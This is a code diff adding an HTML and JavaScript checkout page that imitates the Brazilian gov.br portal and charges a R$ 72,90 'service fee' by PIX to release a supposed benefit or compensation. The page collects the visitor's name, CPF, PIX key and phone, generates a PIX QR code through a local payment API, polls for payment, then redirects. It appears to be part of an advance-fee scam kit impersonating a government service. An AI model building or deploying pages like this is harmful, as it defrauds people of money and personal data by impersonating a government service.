@@ -1,0 +1,572 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Checkout PIX - Taxa de Servico</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700;800&display=swap" rel="stylesheet">
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      font-family: "Roboto", sans-serif;
+      background: linear-gradient(180deg, #eef3fb 0%, #e8eef8 100%);
+      overflow-x: hidden;
+      color: #0f172a;
+    }
+    header {
+      width: 100%;
+      height: 60px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      background-color: #ffffff;
+      padding: 0 20px;
+      border-bottom: 2px solid #0C326F;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.08);
+      position: fixed;
+      top: 0;
+      left: 0;
+      z-index: 10;
+    }
+    .logo-brand {
+      font-size: 34px;
+      font-weight: 800;
+      letter-spacing: -1px;
+      line-height: 1;
+      user-select: none;
+    }
+    .logo-brand .g { color: #2864AE; }
+    .logo-brand .o { color: #F7B731; }
+    .logo-brand .v { color: #27AE60; }
+    .logo-brand .br { color: #2864AE; }
+    .barra { display: flex; align-items: center; gap: 20px; }
+    .barra p { font-size: 14px; color: #333; font-weight: 500; }
+    .usuario-area {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      background-color: #0C326F;
+      padding: 8px 16px;
+      border-radius: 20px;
+      color: white;
+      font-size: 14px;
+      font-weight: 500;
+    }
+    .headMensagem {
+      width: 100%;
+      background: #0C326F;
+      color: #fff;
+      padding: 10px 20px;
+      text-align: center;
+      font-size: 14px;
+      font-weight: 500;
+      position: fixed;
+      top: 60px;
+      left: 0;
+      z-index: 9;
+    }
+    main {
+      padding: 108px 12px 24px;
+      max-width: 560px;
+      margin: 0 auto;
+    }
+    .card {
+      background: #f7faff;
+      border: 1px solid #d7e2f0;
+      border-radius: 16px;
+      box-shadow: 0 14px 36px rgba(12, 50, 111, 0.14);
+      overflow: hidden;
+    }
+    .card-head {
+      background: linear-gradient(180deg, #1753b8 0%, #0b3f98 100%);
+      color: #fff;
+      padding: 14px;
+    }
+    .card-head h1 { font-size: 20px; font-weight: 800; }
+    .card-head p { margin-top: 6px; font-size: 13px; opacity: 0.95; line-height: 1.35; }
+    .section { padding: 14px; border-top: 1px solid #dbe6f4; }
+    .section h2 { font-size: 15px; margin-bottom: 8px; color: #0b3f98; }
+    .grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr;
+      gap: 8px;
+    }
+    .info-box {
+      background: #fff;
+      border: 1px solid #d7e2f1;
+      border-radius: 10px;
+      padding: 10px;
+    }
+    .label { font-size: 11px; color: #64748b; }
+    .value { font-size: 13px; margin-top: 4px; font-weight: 700; word-break: break-word; }
+    .input {
+      width: 100%;
+      border: 1px solid #c7d5e8;
+      background: #fff;
+      border-radius: 10px;
+      padding: 11px;
+      font-size: 14px;
+      margin-top: 8px;
+      outline: none;
+    }
+    .row { display: grid; grid-template-columns: 1fr; gap: 8px; }
+    .price-highlight {
+      text-align: center;
+      border: 1px dashed #b5c8e6;
+      background: #fff;
+      border-radius: 12px;
+      padding: 12px;
+    }
+    .price-highlight .small { font-size: 12px; color: #475569; }
+    .price-highlight .big { font-size: 30px; line-height: 1; margin-top: 6px; color: #0b3f98; font-weight: 800; }
+    .btn {
+      width: 100%;
+      border: none;
+      border-radius: 12px;
+      padding: 13px;
+      font-weight: 800;
+      font-size: 15px;
+      color: #fff;
+      background: linear-gradient(180deg, #1b66ff 0%, #0e56ee 100%);
+      cursor: pointer;
+      box-shadow: 0 8px 18px rgba(27, 102, 255, 0.3);
+      transition: 0.2s ease;
+    }
+    .btn:hover { transform: translateY(-1px); filter: brightness(1.02); }
+    .btn:disabled { opacity: 0.6; cursor: default; transform: none; }
+    .btn.green {
+      background: linear-gradient(180deg, #2ca54d 0%, #1f8a3e 100%);
+      box-shadow: 0 8px 18px rgba(44, 165, 77, 0.3);
+    }
+    .btn.ghost {
+      background: #eff4ff;
+      color: #0b3f98;
+      box-shadow: none;
+      border: 1px solid #bcd0f3;
+    }
+    .sub-btns { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-top: 8px; }
+    .hidden { display: none !important; }
+    .status {
+      margin-top: 8px;
+      font-size: 13px;
+      border-radius: 10px;
+      padding: 10px;
+      border: 1px solid #c9dbf3;
+      background: #eef5ff;
+      color: #134491;
+    }
+    .status.ok { background: #ebfaef; color: #1d7e3c; border-color: #b7ebc4; }
+    .status.error { background: #fff1f2; color: #b4232a; border-color: #fecdd3; }
+    .qr-box {
+      background: #fff;
+      border: 1px solid #d7e2f1;
+      border-radius: 12px;
+      padding: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      min-height: 240px;
+    }
+    .copy-box {
+      margin-top: 10px;
+      background: #fff;
+      border: 1px solid #d7e2f1;
+      border-radius: 10px;
+      padding: 10px;
+      font-size: 12px;
+      color: #334155;
+      word-break: break-all;
+      max-height: 110px;
+      overflow: auto;
+    }
+    .steps {
+      display: grid;
+      grid-template-columns: 1fr 1fr 1fr;
+      gap: 6px;
+    }
+    .step {
+      text-align: center;
+      border-radius: 999px;
+      border: 1px solid #c9daf3;
+      color: #4b6588;
+      font-size: 11px;
+      padding: 5px;
+      background: #f4f8ff;
+      font-weight: 700;
+    }
+    .step.active {
+      color: #fff;
+      border-color: #0b3f98;
+      background: #0b3f98;
+    }
+    .trust {
+      margin-top: 8px;
+      font-size: 12px;
+      color: #4a5f7f;
+      line-height: 1.35;
+    }
+
+    @media (max-width: 768px) {
+      header { height: 50px; padding: 0 10px; }
+      .logo-brand { font-size: 28px; }
+      .usuario-area { padding: 6px 12px; font-size: 12px; }
+      .headMensagem { top: 50px; font-size: 12px; padding: 8px 10px; }
+      main { padding-top: 92px; }
+      .card-head h1 { font-size: 18px; }
+    }
+  </style>
+</head>
+<body>
+  <header>
+    <div class="logo">
+      <div class="logo-brand" aria-label="gov.br">
+        <span class="g">g</span><span class="o">o</span><span class="v">v</span><span class="br">.br</span>
+      </div>
+    </div>
+    <div class="barra">
+      <p>PT ▼</p>
+      <div class="usuario-area">
+        <svg width="20" height="20" viewBox="0 0 24 24" fill="white" xmlns="http://www.w3.org/2000/svg">
+          <circle cx="12" cy="8" r="4"></circle>
+          <path d="M4 20c0-4 4-6 8-6s8 2 8 6" stroke="white" stroke-width="2" fill="none"></path>
+        </svg>
+        <span id="nomeUsuario">Cliente</span>
+      </div>
+    </div>
+  </header>
+
+  <div class="headMensagem">
+    <p>Beneficio <span> > </span> Indenizacao <span> > </span> Checkout</p>
+  </div>
+
+  <main>
+    <div class="card">
+      <div class="card-head">
+        <h1>Finalizar taxa de servico</h1>
+        <p>Pagamento via PIX com validacao imediata para liberar o proximo passo do atendimento.</p>
+      </div>
+
+      <div class="section">
+        <div class="steps">
+          <div id="step1" class="step active">1. Dados</div>
+          <div id="step2" class="step">2. PIX</div>
+          <div id="step3" class="step">3. Confirmacao</div>
+        </div>
+      </div>
+
+      <div class="section">
+        <h2>Resumo</h2>
+        <div class="grid">
+          <div class="info-box">
+            <div class="label">Nome</div>
+            <div id="nameValue" class="value">-</div>
+          </div>
+          <div class="info-box">
+            <div class="label">CPF</div>
+            <div id="cpfValue" class="value">-</div>
+          </div>
+          <div class="info-box">
+            <div class="label">Chave PIX</div>
+            <div id="pixKeyValue" class="value">-</div>
+          </div>
+          <div class="info-box">
+            <div class="label">Valor da taxa</div>
+            <div id="feeValue" class="value">R$ 72,90</div>
+          </div>
+        </div>
+      </div>
+
+      <div class="section">
+        <div class="price-highlight">
+          <div class="small">Total para pagamento</div>
+          <div id="feeBig" class="big">R$ 72,90</div>
+        </div>
+        <div style="margin-top: 10px;">
+          <button id="generateBtn" class="btn">Gerar PIX agora</button>
+        </div>
+        <div id="mainStatus" class="status hidden"></div>
+      </div>
+
+      <div id="pixSection" class="section hidden">
+        <h2>PIX gerado</h2>
+        <div class="qr-box">
+          <div id="qrcode"></div>
+        </div>
+        <div id="copyCode" class="copy-box">Aguardando codigo PIX...</div>
+        <div class="sub-btns">
+          <button id="copyBtn" class="btn ghost">Copiar codigo</button>
+          <button id="verifyBtn" class="btn ghost">Ja paguei - Verificar</button>
+        </div>
+        <div class="trust" style="margin-top: 10px;">
+          Tempo restante aproximado: <b id="expiresLabel">--:--</b>
+        </div>
+      </div>
+
+      <div id="successSection" class="section hidden">
+        <h2>Pagamento confirmado</h2>
+        <div class="status ok">Recebemos a confirmacao do PIX. Seu fluxo sera liberado agora.</div>
+        <div style="margin-top: 10px;">
+          <button id="continueBtn" class="btn green">Continuar</button>
+        </div>
+      </div>
+    </div>
+  </main>
+
+  <script src="https://cdn.jsdelivr.net/npm/qrcodejs2@0.0.2/qrcode.min.js"></script>
+  <script>
+    const API_CREATE = "./api/create-payment.php";
+    const API_CHECK = "./api/check-payment.php";
+    const SESSION_KEY = "checkoutSessionId";
+    const DEFAULT_NEXT_URL = "../index.html";
+    const POLL_INTERVAL_MS = 5000;
+    const POLL_MAX_MS = 10 * 60 * 1000;
+
+    const params = new URLSearchParams(window.location.search);
+    const nome = (params.get("nome") || "Cliente").trim();
+    const cpf = (params.get("cpf") || "").replace(/\D/g, "");
+    const chavePix = (params.get("chave_pix") || cpf).trim();
+    const taxaLabel = (params.get("taxa") || "R$ 72,90").trim();
+    const nextUrl = (params.get("next") || DEFAULT_NEXT_URL).trim();
+    const leadPhone = (params.get("phone") || params.get("telefone") || "").replace(/\D/g, "");
+
+    let amountCents = 7290;
+    let sessionId = localStorage.getItem(SESSION_KEY) || "";
+    let pollTimer = null;
+    let pollStartedAt = 0;
+    let expiresAtRaw = null;
+
+    function parseAmountCents(value) {
+      const onlyNums = value.replace(/[^\d,\.]/g, "").replace(/\./g, "").replace(",", ".");
+      const n = Number(onlyNums);
+      if (Number.isNaN(n) || n <= 0) return 7290;
+      return Math.round(n * 100);
+    }
+
+    function formatBRL(cents) {
+      return (cents / 100).toLocaleString("pt-BR", { style: "currency", currency: "BRL" });
+    }
+
+    function firstName(fullName) {
+      const f = fullName.split(" ")[0] || "Cliente";
+      return f.charAt(0).toUpperCase() + f.slice(1).toLowerCase();
+    }
+
+    function setStep(step) {
+      document.getElementById("step1").classList.toggle("active", step === 1);
+      document.getElementById("step2").classList.toggle("active", step === 2);
+      document.getElementById("step3").classList.toggle("active", step === 3);
+    }
+
+    function showStatus(text, type = "info") {
+      const el = document.getElementById("mainStatus");
+      el.classList.remove("hidden", "ok", "error");
+      if (type === "ok") el.classList.add("ok");
+      if (type === "error") el.classList.add("error");
+      el.textContent = text;
+    }
+
+    function hideStatus() {
+      document.getElementById("mainStatus").classList.add("hidden");
+    }
+
+    function buildCustomerContact() {
+      const normalizedCPF = cpf || "cliente";
+      const email = `${normalizedCPF}@email.com`.replace(/[^\w@.\-]/g, "");
+
+      // Mangofy exige phone. Usa query quando existir, senão fallback fixo.
+      const phone = leadPhone.length >= 10 ? leadPhone : "11999999999";
+
+      return { email, phone };
+    }
+
+    function renderQR(pixCode) {
+      const qrEl = document.getElementById("qrcode");
+      qrEl.innerHTML = "";
+      new QRCode(qrEl, {
+        text: pixCode,
+        width: 220,
+        height: 220,
+        correctLevel: QRCode.CorrectLevel.M
+      });
+    }
+
+    async function createPayment() {
+      const { email, phone } = buildCustomerContact();
+
+      const btn = document.getElementById("generateBtn");
+      btn.disabled = true;
+      hideStatus();
+
+      try {
+        const payload = {
+          session_id: sessionId || undefined,
+          name: nome,
+          document: cpf,
+          phone,
+          email,
+          amount_cents: amountCents,
+          pix_key: chavePix
+        };
+
+        const res = await fetch(API_CREATE, {
+          method: "POST",
+          headers: { "Content-Type": "application/json" },
+          body: JSON.stringify(payload)
+        });
+        const data = await res.json();
+
+        if (!res.ok || !data.ok) {
+          throw new Error(data.error || "Falha ao gerar PIX.");
+        }
+
+        sessionId = data.session_id;
+        localStorage.setItem(SESSION_KEY, sessionId);
+
+        renderQR(data.pix_qrcode_text);
+        document.getElementById("copyCode").textContent = data.pix_qrcode_text;
+        document.getElementById("pixSection").classList.remove("hidden");
+        setStep(2);
+        showStatus("PIX gerado com sucesso. Realize o pagamento para continuar.", "ok");
+
+        expiresAtRaw = data.expires_at || null;
+        startPolling();
+      } catch (err) {
+        showStatus(err.message || "Erro ao gerar pagamento.", "error");
+      } finally {
+        btn.disabled = false;
+      }
+    }
+
+    async function checkPayment() {
+      if (!sessionId) {
+        showStatus("Sessao de pagamento nao encontrada. Gere um novo PIX.", "error");
+        return null;
+      }
+
+      const res = await fetch(`${API_CHECK}?session_id=${encodeURIComponent(sessionId)}`, {
+        method: "GET",
+        headers: { "Accept": "application/json" }
+      });
+      const data = await res.json();
+      if (!res.ok || !data.ok) {
+        throw new Error(data.error || "Falha ao consultar status.");
+      }
+      return data;
+    }
+
+    async function verifyNow() {
+      try {
+        showStatus("Verificando pagamento...", "info");
+        const status = await checkPayment();
+        if (!status) return;
+        if (status.status === "paid") {
+          onPaid();
+          return;
+        }
+        showStatus("Pagamento ainda pendente. Assim que confirmar, avancaremos automaticamente.", "info");
+      } catch (err) {
+        showStatus(err.message || "Erro ao verificar pagamento.", "error");
+      }
+    }
+
+    function onPaid() {
+      setStep(3);
+      document.getElementById("successSection").classList.remove("hidden");
+      showStatus("Pagamento aprovado! Liberando proxima etapa...", "ok");
+      stopPolling();
+      setTimeout(() => {
+        window.location.href = nextUrl;
+      }, 2500);
+    }
+
+    function startPolling() {
+      stopPolling();
+      pollStartedAt = Date.now();
+
+      pollTimer = setInterval(async () => {
+        const elapsed = Date.now() - pollStartedAt;
+        if (elapsed > POLL_MAX_MS) {
+          stopPolling();
+          showStatus("Tempo de verificacao encerrado. Clique em 'Ja paguei - Verificar'.", "error");
+          return;
+        }
+
+        try {
+          const status = await checkPayment();
+          if (status && status.status === "paid") {
+            onPaid();
+          }
+        } catch (err) {
+          // Keep polling even if one request fails
+        }
+      }, POLL_INTERVAL_MS);
+    }
+
+    function stopPolling() {
+      if (pollTimer) {
+        clearInterval(pollTimer);
+        pollTimer = null;
+      }
+    }
+
+    function updateExpireLabel() {
+      if (!expiresAtRaw) {
+        document.getElementById("expiresLabel").textContent = "--:--";
+        return;
+      }
+
+      const normalized = expiresAtRaw.replace(" ", "T");
+      const expiresDate = new Date(normalized);
+      if (Number.isNaN(expiresDate.getTime())) {
+        document.getElementById("expiresLabel").textContent = "--:--";
+        return;
+      }
+
+      const diff = Math.max(0, expiresDate.getTime() - Date.now());
+      const min = String(Math.floor(diff / 60000)).padStart(2, "0");
+      const sec = String(Math.floor((diff % 60000) / 1000)).padStart(2, "0");
+      document.getElementById("expiresLabel").textContent = `${min}:${sec}`;
+    }
+
+    function init() {
+      amountCents = parseAmountCents(taxaLabel);
+
+      document.getElementById("nomeUsuario").textContent = firstName(nome);
+      document.getElementById("nameValue").textContent = nome || "-";
+      document.getElementById("cpfValue").textContent = cpf || "-";
+      document.getElementById("pixKeyValue").textContent = chavePix || "-";
+      document.getElementById("feeValue").textContent = formatBRL(amountCents);
+      document.getElementById("feeBig").textContent = formatBRL(amountCents);
+
+      document.getElementById("generateBtn").addEventListener("click", createPayment);
+      document.getElementById("verifyBtn").addEventListener("click", verifyNow);
+      document.getElementById("copyBtn").addEventListener("click", async () => {
+        const code = document.getElementById("copyCode").textContent || "";
+        if (!code || code.startsWith("Aguardando")) return;
+        await navigator.clipboard.writeText(code);
+        showStatus("Codigo PIX copiado.", "ok");
+      });
+      document.getElementById("continueBtn").addEventListener("click", () => {
+        window.location.href = nextUrl;
+      });
+
+      // If session exists, resume polling
+      if (sessionId) {
+        document.getElementById("pixSection").classList.remove("hidden");
+        setStep(2);
+        showStatus("Retomamos sua sessao de pagamento. Verificando status...", "info");
+        startPolling();
+      }
+
+      setInterval(updateExpireLabel, 1000);
+      updateExpireLabel();
+    }
+
+    window.addEventListener("beforeunload", stopPolling);
+    document.addEventListener("DOMContentLoaded", init);
+  </script>
+</body>
+</html>
+
